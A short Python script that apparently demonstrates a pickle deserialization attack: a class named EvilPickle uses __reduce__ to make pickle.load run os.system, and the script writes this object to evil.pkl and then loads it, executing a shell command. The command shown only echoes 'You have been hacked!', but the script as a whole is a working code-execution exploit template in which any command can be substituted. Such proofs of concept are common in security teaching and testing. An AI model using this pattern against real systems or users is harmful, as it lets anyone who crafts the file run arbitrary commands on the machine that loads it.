import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_and_dump():
    evil = EvilPickle()
    with open('evil.pkl', 'wb') as f:
        pickle.dump(evil, f)

def load_and_deserialize():
    with open('evil.pkl', 'rb') as f:
        pickle.load(f)

serialize_and_dump()
load_and_deserialize()
